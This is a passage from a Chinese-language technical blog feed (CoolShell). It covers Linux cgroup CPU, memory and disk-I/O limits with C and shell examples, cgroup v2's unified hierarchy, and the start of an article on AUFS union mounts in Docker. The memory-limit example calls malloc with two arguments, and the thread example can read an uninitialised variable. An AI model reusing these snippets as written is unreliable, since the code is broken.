<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%86%85%E5%AD%98%E4%BD%BF%E7%94%A8%E9%99%90%E5%88%B6" title="内存使用限制">内存使用限制</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E7%A3%81%E7%9B%98IO%E9%99%90%E5%88%B6" title="磁盘I/O限制">磁盘I/O限制</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#CGroup%E7%9A%84%E5%AD%90%E7%B3%BB%E7%BB%9F" title="CGroup的子系统">CGroup的子系统</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#CGroup%E7%9A%84%E6%9C%AF%E8%AF%AD" title="CGroup的术语">CGroup的术语</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E4%B8%8B%E4%B8%80%E4%BB%A3%E7%9A%84CGroup" title="下一代的CGroup">下一代的CGroup</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E5%8F%82%E8%80%83" title="参考">参考</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="CPU_%E9%99%90%E5%88%B6"></span>CPU 限制<span class="ez-toc-section-end"></span>
</h4>
<p>假设，我们有一个非常吃CPU的程序，叫deadloop，其源码如下：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int main(void)
{
    int i = 0;
    for(;;) i++;
    return 0;
}</pre>
<p>用sudo执行起来后，毫无疑问，CPU被干到了100%（下面是top命令的输出）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND     
 3529 root      20   0    4196    736    656 R 99.6  0.1   0:23.13 deadloop   </pre>
<p>然后，我们这前不是在/sys/fs/cgroup/cpu下创建了一个haoel的group。我们先设置一下这个group的cpu利用的限制：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="fe969d969b90be8b9c8b908a8b">[email protected]</a>:~# cat /sys/fs/cgroup/cpu/haoel/cpu.cfs_quota_us 
-1
<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="097b66667d497c6b7c677d7c">[email protected]</a>:~# echo 20000 &gt; /sys/fs/cgroup/cpu/haoel/cpu.cfs_quota_us</pre>
<p>我们看到，这个进程的PID是3529，我们把这个进程加到这个cgroup中：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW"># echo 3529 &gt;&gt; /sys/fs/cgroup/cpu/haoel/tasks</code></p>
<p>然后，就会在top中看到CPU的利用立马下降成20%了。（前面我们设置的20000就是20%的意思）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND     
 3529 root      20   0    4196    736    656 R 19.9  0.1   8:06.11 deadloop    </pre>
<p>下面的代码是一个线程的示例：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#define _GNU_SOURCE         /* See feature_test_macros(7) */

#include &lt;pthread.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/syscall.h&gt;


const int NUM_THREADS = 5;

void *thread_main(void *threadid)
{
    /* 把自己加入cgroup中（syscall(SYS_gettid)为得到线程的系统tid） */
    char cmd[128];
    sprintf(cmd, "echo %ld &gt;&gt; /sys/fs/cgroup/cpu/haoel/tasks", syscall(SYS_gettid));
    system(cmd); 
    sprintf(cmd, "echo %ld &gt;&gt; /sys/fs/cgroup/cpuset/haoel/tasks", syscall(SYS_gettid));
    system(cmd);

    long tid;
    tid = (long)threadid;
    printf("Hello World! It's me, thread #%ld, pid #%ld!\n", tid, syscall(SYS_gettid));
    
    int a=0; 
    while(1) {
        a++;
    }
    pthread_exit(NULL);
}
int main (int argc, char *argv[])
{
    int num_threads;
    if (argc &gt; 1){
        num_threads = atoi(argv[1]);
    }
    if (num_threads&lt;=0 || num_threads&gt;=100){
        num_threads = NUM_THREADS;
    }

    /* 设置CPU利用率为50% */
    mkdir("/sys/fs/cgroup/cpu/haoel", 755);
    system("echo 50000 &gt; /sys/fs/cgroup/cpu/haoel/cpu.cfs_quota_us");

    mkdir("/sys/fs/cgroup/cpuset/haoel", 755);
    /* 限制CPU只能使用#2核和#3核 */
    system("echo \"2,3\" &gt; /sys/fs/cgroup/cpuset/haoel/cpuset.cpus");

    pthread_t* threads = (pthread_t*) malloc (sizeof(pthread_t)*num_threads);
    int rc;
    long t;
    for(t=0; t&lt;num_threads; t++){
        printf("In main: creating thread %ld\n", t);
        rc = pthread_create(&amp;threads[t], NULL, thread_main, (void *)t);
        if (rc){
            printf("ERROR; return code from pthread_create() is %d\n", rc);
            exit(-1);
        }
    }

    /* Last thing that main() should do */
    pthread_exit(NULL);
    free(threads);
}
</pre>
<h4>
<span class="ez-toc-section" id="%E5%86%85%E5%AD%98%E4%BD%BF%E7%94%A8%E9%99%90%E5%88%B6"></span>内存使用限制<span class="ez-toc-section-end"></span>
</h4>
<p>我们再来看一个限制内存的例子（下面的代码是个死循环，其它不断的分配内存，每次512个字节，每次休息一秒）：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;

int main(void)
{
    int size = 0;
    int chunk_size = 512;
    void *p = NULL;

    while(1) {

        if ((p = malloc(p, chunk_size)) == NULL) {
            printf("out of memory!!\n");
            break;
        }
        memset(p, 1, chunk_size);
        size += chunk_size;
        printf("[%d] - memory is allocated [%8d] bytes \n", getpid(), size);
        sleep(1);
    }
    return 0;
}</pre>
<p>然后，在我们另外一边：<br>
</p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"># 创建memory cgroup
$ mkdir /sys/fs/cgroup/memory/haoel
$ echo 64k &gt; /sys/fs/cgroup/memory/haoel/memory.limit_in_bytes

# 把上面的进程的pid加入这个cgroup
$ echo [pid] &gt; /sys/fs/cgroup/memory/haoel/tasks </pre>
<p>你会看到，一会上面的进程就会因为内存问题被kill掉了。</p>
<h4>
<span class="ez-toc-section" id="%E7%A3%81%E7%9B%98IO%E9%99%90%E5%88%B6"></span>磁盘I/O限制<span class="ez-toc-section-end"></span>
</h4>
<p>我们先看一下我们的硬盘IO，我们的模拟命令如下：（从/dev/sda1上读入数据，输出到/dev/null上）</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">sudo dd if=/dev/sda1 of=/dev/null</code></p>
<p>我们通过iotop命令我们可以看到相关的IO速度是55MB/s（虚拟机内）：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">  TID  PRIO  USER     DISK READ  DISK WRITE  SWAPIN     IO&gt;    COMMAND          
 8128 be/4 root       55.74 M/s    0.00 B/s  0.00 % 85.65 % dd if=/de~=/dev/null...</pre>
<p>然后，我们先创建一个blkio（块设备IO）的cgroup</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">mkdir /sys/fs/cgroup/blkio/haoel</code></p>
<p>并把读IO限制到1MB/s，并把前面那个dd命令的pid放进去（注：8:0 是设备号，你可以通过ls -l /dev/sda1获得）：<br>
</p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="51233e3e25112433243f2524">[email protected]</a>:~# echo '8:0 1048576'  &gt; /sys/fs/cgroup/blkio/haoel/blkio.throttle.read_bps_device 
<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="70021f1f04300512051e0405">[email protected]</a>:~# echo 8128 &gt; /sys/fs/cgroup/blkio/haoel/tasks</pre>
<p>再用iotop命令，你马上就能看到读速度被限制到了1MB/s左右。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">  TID  PRIO  USER     DISK READ  DISK WRITE  SWAPIN     IO&gt;    COMMAND          
 8128 be/4 root      973.20 K/s    0.00 B/s  0.00 % 94.41 % dd if=/de~=/dev/null...</pre>
<h4>
<span class="ez-toc-section" id="CGroup%E7%9A%84%E5%AD%90%E7%B3%BB%E7%BB%9F"></span>CGroup的子系统<span class="ez-toc-section-end"></span>
</h4>
<p>好了，有了以上的感性认识我们来，我们来看看control group有哪些子系统：</p>
<ul>
<li>blkio — 这​​​个​​​子​​​系​​​统​​​为​​​块​​​设​​​备​​​设​​​定​​​输​​​入​​​/输​​​出​​​限​​​制​​​，比​​​如​​​物​​​理​​​设​​​备​​​（磁​​​盘​​​，固​​​态​​​硬​​​盘​​​，USB 等​​​等​​​）。</li>
<li>cpu — 这​​​个​​​子​​​系​​​统​​​使​​​用​​​调​​​度​​​程​​​序​​​提​​​供​​​对​​​ CPU 的​​​ cgroup 任​​​务​​​访​​​问​​​。​​​</li>
<li>cpuacct — 这​​​个​​​子​​​系​​​统​​​自​​​动​​​生​​​成​​​ cgroup 中​​​任​​​务​​​所​​​使​​​用​​​的​​​ CPU 报​​​告​​​。​​​</li>
<li>cpuset — 这​​​个​​​子​​​系​​​统​​​为​​​ cgroup 中​​​的​​​任​​​务​​​分​​​配​​​独​​​立​​​ CPU（在​​​多​​​核​​​系​​​统​​​）和​​​内​​​存​​​节​​​点​​​。​​​</li>
<li>devices — 这​​​个​​​子​​​系​​​统​​​可​​​允​​​许​​​或​​​者​​​拒​​​绝​​​ cgroup 中​​​的​​​任​​​务​​​访​​​问​​​设​​​备​​​。​​​</li>
<li>freezer — 这​​​个​​​子​​​系​​​统​​​挂​​​起​​​或​​​者​​​恢​​​复​​​ cgroup 中​​​的​​​任​​​务​​​。​​​</li>
<li>memory — 这​​​个​​​子​​​系​​​统​​​设​​​定​​​ cgroup 中​​​任​​​务​​​使​​​用​​​的​​​内​​​存​​​限​​​制​​​，并​​​自​​​动​​​生​​​成​​​​​内​​​存​​​资​​​源使用​​​报​​​告​​​。​​​</li>
<li>net_cls — 这​​​个​​​子​​​系​​​统​​​使​​​用​​​等​​​级​​​识​​​别​​​符​​​（classid）标​​​记​​​网​​​络​​​数​​​据​​​包​​​，可​​​允​​​许​​​ Linux 流​​​量​​​控​​​制​​​程​​​序​​​（tc）识​​​别​​​从​​​具​​​体​​​ cgroup 中​​​生​​​成​​​的​​​数​​​据​​​包​​​。​​​</li>
<li>net_prio — 这个子系统用来设计网络流量的优先级</li>
<li>hugetlb — 这个子系统主要针对于HugeTLB系统进行限制，这是一个大页文件系统。</li>
<p>​​​</p>
</ul>
<p>注意，你可能在Ubuntu 14.04下看不到net_cls和net_prio这两个cgroup，你需要手动mount一下：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ sudo modprobe cls_cgroup
$ sudo mkdir /sys/fs/cgroup/net_cls
$ sudo mount -t cgroup -o net_cls none /sys/fs/cgroup/net_cls

$ sudo modprobe netprio_cgroup
$ sudo mkdir /sys/fs/cgroup/net_prio
$ sudo mount -t cgroup -o net_prio none /sys/fs/cgroup/net_prio</pre>
<p>关于各个子系统的参数细节，以及更多的Linux CGroup的文档，你可以看看下面的文档：</p>
<ul>
<li><a href="https://www.kernel.org/doc/Documentation/cgroups/" target="_blank">Linux Kernel的官方文档</a></li>
<li><a href="https://access.redhat.com/documentation/zh-CN/Red_Hat_Enterprise_Linux/6/html-single/Resource_Management_Guide/index.html#ch-Subsystems_and_Tunable_Parameters" target="_blank">Redhat的官方文档</a></li>
</ul>
<h4>
<span class="ez-toc-section" id="CGroup%E7%9A%84%E6%9C%AF%E8%AF%AD"></span>CGroup的术语<span class="ez-toc-section-end"></span>
</h4>
<p>CGroup有下述术语：</p>
<ul>
<li>
<strong>任务（Tasks）</strong>：就是系统的一个进程。</li>
<li>
<strong>控制组（Control Group）</strong>：一组按照某种标准划分的进程，比如官方文档中的Professor和Student，或是WWW和System之类的，其表示了某进程组。Cgroups中的资源控制都是以控制组为单位实现。一个进程可以加入到某个控制组。而资源的限制是定义在这个组上，就像上面示例中我用的haoel一样。简单点说，cgroup的呈现就是一个目录带一系列的可配置文件。</li>
<li>
<strong>层级（Hierarchy）</strong>：控制组可以组织成hierarchical的形式，既一颗控制组的树（目录结构）。控制组树上的子节点继承父结点的属性。简单点说，hierarchy就是在一个或多个子系统上的cgroups目录树。</li>
<li>
<strong>子系统（Subsystem）</strong>：一个子系统就是一个资源控制器，比如CPU子系统就是控制CPU时间分配的一个控制器。子系统必须附加到一个层级上才能起作用，一个子系统附加到某个层级以后，这个层级上的所有控制族群都受到这个子系统的控制。Cgroup的子系统可以有很多，也在不断增加中。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E4%B8%8B%E4%B8%80%E4%BB%A3%E7%9A%84CGroup"></span>下一代的CGroup<span class="ez-toc-section-end"></span>
</h4>
<p>上面，我们可以看到，CGroup的一些常用方法和相关的术语。一般来说，这样的设计在一般情况下还是没什么问题的，除了操作上的用户体验不是很好，但基本满足我们的一般需求了。</p>
<p>不过，对此，有个叫Tejun Heo的同学非常不爽，他在Linux社区里<a href="https://lwn.net/Articles/484254/" target="_blank">对cgroup吐了一把槽</a>，还引发了内核组的各种讨论。</p>
<p>对于Tejun Heo同学来说，cgroup设计的相当糟糕。他给出了些例子，大意就是说，如果有多种层级关系，也就是说有多种对进程的分类方式，比如，我们可以按用户来分，分成Professor和Student，同时，也有按应用类似来分的，比如WWW和NFS等。那么，当一个进程即是Professor的，也是WWW的，那么就会出现多层级正交的情况，从而出现对进程上管理的混乱。另外，一个case是，如果有一个层级A绑定cpu，而层级B绑定memory，还有一个层级C绑定cputset，而有一些进程有的需要AB，有的需要AC，有的需要ABC，管理起来就相当不易。 </p>
<p>层级操作起来比较麻烦，而且如果层级变多，更不易于操作和管理，虽然那种方式很好实现，但是在使用上有很多的复杂度。你可以想像一个图书馆的图书分类问题，你可以有各种不同的分类，分类和图书就是一种多对多的关系。</p>
<p>所以，在Kernel 3.16后，引入了<a href="https://lwn.net/Articles/601840/" target="_blank">unified hierarchy</a>的新的设计，这个东西引入了一个叫<strong>__DEVEL__sane_behavior</strong>的特性（这个名字很明显意味目前还在开发试验阶段），它可以把所有子系统都挂载到根层级下，只有叶子节点可以存在tasks，非叶子节点只进行资源控制。</p>
<p>我们mount一下看看：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ sudo mount -t cgroup -o __DEVEL__sane_behavior cgroup ./cgroup

$ ls ./cgroup
cgroup.controllers  cgroup.procs  cgroup.sane_behavior  cgroup.subtree_control 

$ cat ./cgroup/cgroup.controllers
cpuset cpu cpuacct memory devices freezer net_cls blkio perf_event net_prio hugetlb</pre>
<p>我们可以看到有四个文件，然后，你在这里mkdir一个子目录，里面也会有这四个文件。<strong>上级的cgroup.subtree_control控制下级的cgroup.controllers。</strong></p>
<p>举个例子：假设我们有以下的目录结构，b代表blkio，m代码memory，其中，A是root，包括所有的子系统（）。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"># A(b,m) - B(b,m) - C (b)
#               \ - D (b) - E

# 下面的命令中， +表示enable， -表示disable

# 在B上的enable blkio
# echo +blkio &gt; A/cgroup.subtree_control

# 在C和D上enable blkio 
# echo +blkio &gt; A/B/cgroup.subtree_control

# 在B上enable memory  
# echo +memory &gt; A/cgroup.subtree_control</pre>
<p>在上述的结构中，</p>
<ul>
<li>cgroup只有上线控制下级，无法传递到下下级。所以，C和D中没有memory的限制，E中没有blkio和memory的限制。而本层的cgroup.controllers文件是个只读的，其中的内容就看上级的subtree_control里有什么了。</li>
<li>
<strong>任何被配置过subtree_control的目录都不能绑定进程，根结点除外</strong>。所以，A,C,D,E可以绑上进程，但是B不行。</li>
</ul>
<p>我们可以看到，<strong>这种方式干净的区分开了两个事，一个是进程的分组，一个是对分组的资源控制</strong>（以前这两个事完全混在一起），在目录继承上增加了些限制，这样可以避免一些模棱两可的情况。</p>
<p>当然，这个事还在演化中，cgroup的这些问题这个事目前由cgroup的吐槽人Tejun Heo和华为的Li Zefan同学负责解决中。总之，这是一个系统管理上的问题，而且改变会影响很多东西，但一旦方案确定，老的cgroup方式将一去不复返。</p>
<h4>
<span class="ez-toc-section" id="%E5%8F%82%E8%80%83"></span>参考<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li><a href="https://www.kernel.org/doc/Documentation/cgroups/" target="_blank">Linux Kernel Cgroup Documents</a></li>
<li><a href="https://access.redhat.com/documentation/zh-CN/Red_Hat_Enterprise_Linux/6/html-single/Resource_Management_Guide/index.html" target="_blank">Reahat Resource Management Guide</a></li>
<li><a href="https://lwn.net/Articles/484251/" target="_blank">Fixing control groups</a></li>
<li><a href="https://lwn.net/Articles/601840/" target="_blank">The unified control group hierarchy in 3.16</a></li>
<li><a href="https://events.linuxfoundation.org/sites/events/files/slides/2014-KLF.pdf" target="_blank">Cgroup v2(PDF)</a></li>
</ul>
<p>（全文完）<br>
</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2015-04-17T09:03:57+08:00</pubDate>
<guid>https://coolshell.cn/articles/17049.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Docker基础技术：AUFS ]]></title>
<link>https://coolshell.cn/articles/17061.html</link>
<content><![CDATA[ 
<p><a href="https://coolshell.cn/wp-content/uploads/2015/08/docker-filesystems-busyboxrw.png"><img alt="image placeholder" ></a>AUFS是一种Union File System，所谓UnionFS就是把不同物理位置的目录合并mount到同一个目录中。UnionFS的一个最主要的应用是，把一张CD/DVD和一个硬盘目录给联合 mount在一起，然后，你就可以对这个只读的CD/DVD上的文件进行修改（当然，修改的文件存于硬盘上的目录里）。</p>
<p>AUFS又叫Another UnionFS，后来叫Alternative UnionFS，后来可能觉得不够霸气，叫成Advance UnionFS。是个叫Junjiro Okajima（岡島順治郎）在2006年开发的，AUFS完全重写了早期的UnionFS 1.x，其主要目的是为了可靠性和性能，并且引入了一些新的功能，比如可写分支的负载均衡。AUFS在使用上全兼容UnionFS，而且比之前的UnionFS在稳定性和性能上都要好很多，后来的UnionFS 2.x开始抄AUFS中的功能。但是他居然没有进到Linux主干里，就是因为Linus不让，基本上是因为代码量比较多，而且写得烂（相对于只有3000行的union mount和10000行的UnionFS，以及其它平均下来只有6000行代码左右的VFS，AUFS居然有30000行代码），所以，岡島不断地改进代码质量，不断地提交，不断地被Linus拒掉，所以，到今天AUFS都还进不了Linux主干（今天你可以看到AUFS的代码其实还好了，比起OpenSSL好N倍，要么就是Linus对代码的质量要求非常高，要么就是Linus就是不喜欢AUFS）。</p>
<p>不过，好在有很多发行版都用了AUFS，比如：Ubuntu 10.04，Debian6.0, Gentoo Live CD支持AUFS，所以，也OK了。</p>
<p>好了，扯完这些闲话，我们还是看一个示例吧（环境：Ubuntu 14.04）</p>
<p><span id="more-17061"></span></p>
<p>首先，我们建上两个目录（水果和蔬菜），并在这两个目录中放上一些文件，水果中有苹果和蕃茄，蔬菜有胡萝卜和蕃茄。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ tree
.
├── fruits
│   ├── apple
│   └── tomato
└── vegetables
    ├── carrots
    └── tomato

</pre>
<p>然后，我们输入以下命令：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"># 创建一个mount目录
$ mkdir mnt

# 把水果目录和蔬菜目录union mount到 ./mnt目录中
$ sudo mount -t aufs -o dirs=./fruits:./vegetables none ./mnt

#  查看./mnt目录
$ tree ./mnt
./mnt
├── apple
├── carrots
└── tomato</pre>
<p>我们可以看到在./mnt目录下有三个文件，苹果apple、胡萝卜carrots和蕃茄tomato。水果和蔬菜的目录被union到了./mnt目录下了。</p>
<p>我们来修改一下其中的文件内容：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ echo mnt &gt; ./mnt/apple
$ cat ./mnt/apple
mnt
$ cat ./fruits/apple
mnt</pre>
<p>上面的示例，我们可以看到./mnt/apple的内容改了，./fruits/apple的内容也改了。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ echo mnt_carrots &gt; ./mnt/carrots
$ cat ./vegetables/carrots 

$ cat ./fruits/carrots
mnt_carrots
</pre>
<p>上面的示例，我们可以看到，我们修改了./mnt/carrots的文件内容，./vegetables/carrots并没有变化，反而是./fruits/carrots的目录中出现了carrots文件，其内容是我们在./mnt/carrots里的内容。</p>
<p>也就是说，我们在mount aufs命令中，我们没有指它vegetables和fruits的目录权限，默认上来说，命令行上第一个（最左边）的目录是可读可写的，后面的全都是只读的。（一般来说，最前面的目录应该是可写的，而后面的都应该是只读的）</p>
<p>所以，如果我们像下面这样指定权限来mount aufs，你就会发现有不一样的效果（记得先把上面./fruits/carrots的文件删除了）：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ sudo mount -t aufs -o dirs=./fruits=rw:./vegetables=rw none ./mnt

$ echo "mnt_carrots" &gt; ./mnt/carrots 

$ cat ./vegetables/carrots
mnt_carrots

$ cat ./fruits/carrots
cat: ./fruits/carrots: No such file or directory</pre>
<p>现在，在这情况下，如果我们要修改./mnt/tomato这个文件，那么究竟是哪个文件会被改写？</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ echo "mnt_tomato" &gt; ./mnt/tomato 

$ cat ./fruits/tomato
mnt_tomato

$ cat ./vegetables/tomato
I am a vegetable</pre>
<p>可见，如果有重复的文件名，在mount命令行上，越往前的就优先级越高。</p>
<p>你可以用这个例子做一些各种各样的试验，我这里主要是给大家一个感性认识，就不展开试验下去了。</p>
<p>那么，这种UnionFS有什么用？</p>
<p>历史上，有一个叫<a href="https://zh.wikipedia.org/wiki/Knoppix" target="_blank">Knoppix的Linux发行版</a>，其主要用于Linux演示、光盘教学、系统急救，以及商业产品的演示，不需要硬盘安装，直接把CD/DVD上的image运行在一个可写的存储设备上（比如一个U盘上），其实，也就是把CD/DVD这个文件系统和USB这个可写的系统给联合mount起来，这样你对CD/DVD上的image做的任何改动都会在被应用在U盘上，于是乎，你可以对CD/DVD上的内容进行任意的修改，因为改动都在U盘上，所以你改不坏原来的东西。</p>
<p>我们可以再发挥一下想像力，你也可以把一个目录，比如你的源代码，作为一个只读的template，和另一个你的working directory给union在一起，然后你就可以做各种修改而不用害怕会把源代码改坏了。有点像一个ad hoc snapshot。</p>
<p>Docker把UnionFS的想像力发挥到了容器的镜像。你是否还记得我在<a title="Docker基础技术：Linux Namespace（上）" href="https://coolshell.cn/articles/17010.html" target="_blank">介绍Linux Namespace上篇</a>中用mount namespace和chroot山寨了一镜像。现在当你看过了这个UnionFS的技术后，你是不是就明白了，你完全可以用UnionFS这样的技术做出分层的镜像来。</p>
<p>下图来自Docker的官方文档<a href="https://docs.docker.com/terms/layer/" target="_blank">Layer</a>，其很好的展示了Docker用UnionFS搭建的分层镜像。</p>
<p><img alt="image placeholder" ></p>
<p>关于docker的分层镜像，除了aufs，docker还支持btrfs, devicemapper和vfs，你可以使用 -s 或 –storage-driver= 选项来指定相关的镜像存储。在Ubuntu 14.04下，docker默认Ubuntu的 aufs（在CentOS7下，用的是devicemapper，关于devicemapper，我会以以后的文章中讲解）你可以在下面的目录中查看相关的每个层的镜像：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">/var/lib/docker/aufs/diff/&lt;id&gt; </code></p>
<p>在docker执行起来后（比如：docker run -it ubuntu /bin/bash ），你可以从/sys/fs/aufs/si_[id]目录下查看aufs的mount的情况，下面是个示例：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">#ls /sys/fs/aufs/si_b71b209f85ff8e75/
br0      br2      br4      br6      brid1    brid3    brid5    xi_path
br1      br3      br5      brid0    brid2    brid4    brid6 

# cat /sys/fs/aufs/si_b71b209f85ff8e75/*
/var/lib/docker/aufs/diff/87315f1367e5703f599168d1e17528a0500bd2e2df7d2fe2aaf9595f3697dbd7=rw
/var/lib/docker/aufs/diff/87315f1367e5703f599168d1e17528a0500bd2e2df7d2fe2aaf9595f3697dbd7-init=ro+wh
/var/lib/docker/aufs/diff/d0955f21bf24f5bfffd32d2d0bb669d0564701c271bc3dfc64cfc5adfdec2d07=ro+wh
/var/lib/docker/aufs/diff/9fec74352904baf5ab5237caa39a84b0af5c593dc7cc08839e2ba65193024507=ro+wh
/var/lib/docker/aufs/diff/a1a958a248181c9aa6413848cd67646e5afb9797f1a3da5995c7a636f050f537=ro+wh
/var/lib/docker/aufs/diff/f3c84ac3a0533f691c9fea4cc2ceaaf43baec22bf8d6a479e069f6d814be9b86=ro+wh
/var/lib/docker/aufs/diff/511136ea3c5a64f264b78b5433614aec563103b4d4702f3ba7d4d2698e22c158=ro+wh
64
65
66
67
68
69
70
/run/shm/aufs.xino</pre>
<p>你会看到只有最顶上的层（branch）是rw权限，其它的都是ro+wh权限只读的。</p>
<p>关于docker的aufs的配置，你可以在/var/lib/docker/repositories-aufs这个文件中看到。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-1" href="#AUFS%E7%9A%84%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7" title="AUFS的一些特性">AUFS的一些特性</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%9B%B8%E5%85%B3%E6%9C%AF%E8%AF%AD" title="相关术语">相关术语</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-3" href="#%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98" title="相关问题">相关问题</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#AUFS%E7%9A%84%E6%80%A7%E8%83%BD" title="AUFS的性能">AUFS的性能</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E5%BB%B6%E4%BC%B8%E9%98%85%E8%AF%BB" title="延伸阅读">延伸阅读</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="AUFS%E7%9A%84%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7"></span>AUFS的一些特性<span class="ez-toc-section-end"></span>
</h4>
<p>AUFS有所有Union FS的特性，把多个目录，合并成同一个目录，并可以为每个需要合并的目录指定相应的权限，实时的添加、删除、修改已经被mount好的目录。而且，他还能在多个可写的branch/dir间进行负载均衡。</p>
<p>上面的例子，我们已经看到AUFS的mount的示例了。下面我们来看一看被union的目录（分支）的相关权限：</p>
<ul>
<li>rw表示可写可读read-write。</li>
<li>ro表示read-only，如果你不指权限，那么除了第一个外ro是默认值，对于ro分支，其永远不会收到写操作，也不会收到查找whiteout的操作。</li>
<li>rr表示real-read-only，与read-only不同的是，rr标记的是天生就是只读的分支，这样，AUFS可以提高性能，比如不再设置inotify来检查文件变动通知。</li>
</ul>
<p>权限中，我们看到了一个术语：whiteout，下面我来解释一下这个术语。</p>
<p>一般来说ro的分支都会有wh的属性，比如 “[dir]=ro+wh”。所谓whiteout的意思，如果在union中删除的某个文件，实际上是位于一个readonly的分支（目录）上，那么，在mount的union这个目录中你将看不到这个文件，但是read-only这个层上我们无法做任何的修改，所以，我们就需要对这个readonly目录里的文件作whiteout。AUFS的whiteout的实现是通过在上层的可写的目录下建立对应的whiteout隐藏文件来实现的。</p>
<p>看个例子：</p>
<p>假设我们有三个目录和文件如下所示（test是个空目录）：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"># tree
.
├── fruits
│   ├── apple
│   └── tomato
├── test
└── vegetables
    ├── carrots
    └── tomato</pre>
<p>我们如下mount：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"># mkdir mnt

# mount -t aufs -o dirs=./test=rw:./fruits=ro:./vegetables=ro none ./mnt

# # ls ./mnt/
apple  carrots  tomato </pre>
<p>现在我们在权限为rw的test目录下建个whiteout的隐藏文件.wh.apple，你就会发现./mnt/apple这个文件就消失了:</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"> # touch ./test/.wh.apple

# ls ./mnt
carrots  tomato</pre>
<p>上面这个操作和 rm ./mnt/apple是一样的。</p>
<h5>
<span class="ez-toc-section" id="%E7%9B%B8%E5%85%B3%E6%9C%AF%E8%AF%AD"></span>相关术语<span class="ez-toc-section-end"></span>
</h5>
<p><b>Branch</b> – 就是各个要被union起来的目录（就是我在上面使用的dirs的命令行参数）</p>
<ul>
<li>Branch根据被union的顺序形成一个stack，一般来说最上面的是可写的，下面的都是只读的。</li>
<li>Branch的stack可以在被mount后进行修改，比如：修改顺序，加入新的branch，或是删除其中的branch，或是直接修改branch的权限</li>
</ul>
<p><b>Whiteout</b> 和 <b>Opaque</b></p>
<ul>
